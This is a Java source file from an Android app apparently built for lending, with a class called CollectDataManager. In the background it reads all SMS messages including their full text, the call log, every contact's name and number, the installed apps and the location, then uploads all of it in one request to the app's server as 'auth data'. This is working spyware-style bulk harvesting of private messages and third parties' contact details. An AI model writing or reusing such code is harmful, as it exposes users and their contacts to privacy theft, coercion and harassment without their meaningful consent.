package com.loadapp.load.collect;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.util.Log;

import com.blankj.utilcode.util.GsonUtils;
import com.blankj.utilcode.util.ThreadUtils;
import com.blankj.utilcode.util.Utils;
import com.loadapp.load.BuildConfig;
import com.loadapp.load.api.Api;
import com.loadapp.load.collect.request.AppInfoRequest;
import com.loadapp.load.collect.request.ContactRequest;
import com.loadapp.load.collect.request.SmsRequest;
import com.loadapp.load.global.Constant;
import com.loadapp.load.util.BuildRequestJsonUtil;
import com.lzy.okgo.OkGo;
import com.lzy.okgo.callback.StringCallback;
import com.lzy.okgo.model.Response;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

public class CollectDataManager {

    private static final String TAG = "CollectDataManager";

    private static CollectDataManager mManager;

    private CollectDataManager() {

    }

    public static CollectDataManager getInstance() {
        if (mManager == null) {
            synchronized (CollectDataManager.class) {
                if (mManager == null) {
                    mManager = new CollectDataManager();
                }
            }
        }
        return mManager;
    }

    public void collectAuthData(Context context, Observer observer) {
        ThreadUtils.executeByCached(new ThreadUtils.SimpleTask<Object>() {
            @Override
            public Object doInBackground() throws Throwable {
                String smsStr = GsonUtils.toJson(readSms(context));
                String callRecordStr = readCallRecord(context);
                String contractStr = GsonUtils.toJson(readContract(context));
                String appInfoStr = GsonUtils.toJson(readAllAppInfo());

                String addressInfo = GsonUtils.toJson(LocationMgr.getInstance().getAddressInfo());

                getAuthData(smsStr, callRecordStr, contractStr, appInfoStr, addressInfo, observer);
                return null;
            }

            @Override
            public void onSuccess(Object result) {

            }
        });
    }

    private static ArrayList<SmsRequest> readSms(Context context) {
        ArrayList<SmsRequest> list = new ArrayList<>();
        Uri uri = Uri.parse("content://sms/");
        String[] projection = new String[]{"_id", "address", "person", "body", "date", "type", "status", "read"};
        ContentResolver resolver = context.getContentResolver();
        Cursor cursor = resolver.query(uri, projection, null, null, null);
        try {
            if (cursor != null && cursor.getCount() > 0) {
                while (cursor.moveToNext()) {
                    int _id = cursor.getInt(0);//id
                    String address = cursor.getString(1);//电话号码
                    String body = cursor.getString(3);//短信内容
                    long date = cursor.getLong(4);
                    int type = cursor.getInt(5);
                    int status = cursor.getInt(6);
                    int read = cursor.getInt(7);

                    SmsRequest smsRequest = new SmsRequest();
                    smsRequest.addr = address;
                    smsRequest.body = body;
                    smsRequest.time = date;
                    smsRequest.type = type;
                    smsRequest.status = status;
                    smsRequest.read = read;
//                    public int read;
//                    public int status;
                    smsRequest.addr = address;
                    list.add(smsRequest);
                }
            }
        } catch (Exception e) {
            if (BuildConfig.DEBUG) {
                throw e;
            }
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        return list;
    }

    private String readCallRecord(Context context) {
        StringBuffer callRecordContent = new StringBuffer();
        ContentResolver cr = context.getContentResolver();
        Uri uri = CallLog.Calls.CONTENT_URI;
        String[] projection = new String[]{CallLog.Calls.NUMBER, CallLog.Calls.DATE,
                CallLog.Calls.TYPE};
        Cursor cursor = null;
        try {
            cursor = cr.query(uri, projection, null, null, null);
            while (cursor.moveToNext()) {
                String number = cursor.getString(0);
                long date = cursor.getLong(1);
                int type = cursor.getInt(2);
                callRecordContent.append("num ").append(number)
                        .append("date ").append(date)
                        .append(type).append(type);
            }
        } catch (Exception e) {
            e.printStackTrace();
            Log.e(TAG, "read cardCord exception = " + e.toString());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        return callRecordContent.toString();
    }

    private ArrayList<ContactRequest> readContract(Context context) {
        //调用并获取联系人信息
        Cursor cursor = null;
        ArrayList<ContactRequest> list = new ArrayList<>();
        try {
            cursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null, null, null, null);
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String id = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone._ID));
                    String displayName = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    long lastUpdateTime = cursor.getLong(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_LAST_UPDATED_TIMESTAMP));
//                    Log.e(TAG, " photo = " + photoUri + "  ringtone = " + ringtone + " look = " + lookupUri);
                    ContactRequest contactRequest = new ContactRequest();
                    contactRequest.name = displayName;
                    contactRequest.number = number;
                    contactRequest.lastUpdate = lastUpdateTime;
                    list.add(contactRequest);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
            Log.e(TAG, " exception = " + e.toString());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        return list;
    }

    private ArrayList<AppInfoRequest> readAllAppInfo() {
        ArrayList<AppInfoRequest> list = new ArrayList<>();
        PackageManager pm = Utils.getApp().getPackageManager();
        if (pm == null) {
            return list;
        }
        List<PackageInfo> installedPackages = pm.getInstalledPackages(0);
        if (installedPackages == null) {
            return list;
        }
        for (int i = 0; i < installedPackages.size(); i++) {
            PackageInfo packageInfo = installedPackages.get(i);

            AppInfoRequest appInfoRequest = new AppInfoRequest();
            appInfoRequest.packageName = packageInfo.packageName;
            appInfoRequest.lu = packageInfo.lastUpdateTime;
            appInfoRequest.it = packageInfo.firstInstallTime;
            ApplicationInfo ai = packageInfo.applicationInfo;
            if (ai != null) {
                boolean isSystem = (ApplicationInfo.FLAG_SYSTEM & ai.flags) != 0;
                appInfoRequest.type = isSystem ? 0 : 1;
                try {
                    appInfoRequest.name = ai.loadLabel(pm).toString();
                } catch (Exception e) {

                }
            }
            list.add(appInfoRequest);
        }
        return list;
    }

    @SuppressLint("MissingPermission")
    private static void getAuthData(String smsStr, String callRecordStr, String
            contractStr, String appListStr, String addressInfoStr, Observer observer) {
        JSONObject jsonObject = BuildRequestJsonUtil.buildRequestJson();
        try {
            jsonObject.put("account_id", Constant.mAccountId);
            //通讯录
            jsonObject.put("contact", contractStr);
            //短信
            jsonObject.put("sms", smsStr);
            //通讯记录
            jsonObject.put("callRecord", callRecordStr);
            //APPList
            jsonObject.put("appList", appListStr);
            //通讯记录
            jsonObject.put("addressInfo", addressInfoStr);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        OkGo.<String>post(Api.UPLOAD_CLIENT_INFO).tag(TAG).
                params("data", jsonObject.toString()).
                execute(new StringCallback() {
                    @Override
                    public void onSuccess(Response<String> response) {
//                        Log.i(TAG, " response success= " + response.body());
                        if (observer != null) {
                            observer.success(response);
                        }
                    }

                    @Override
                    public void onError(Response<String> response) {
                        super.onError(response);
//                        Log.i(TAG, "getAuthData response error = ");
                        if (observer != null) {
                            observer.failure(response);
                        }
                    }
                });
    }

    public interface Observer {
        void success(Response<String> response);

        void failure(Response<String> response);
    }
}
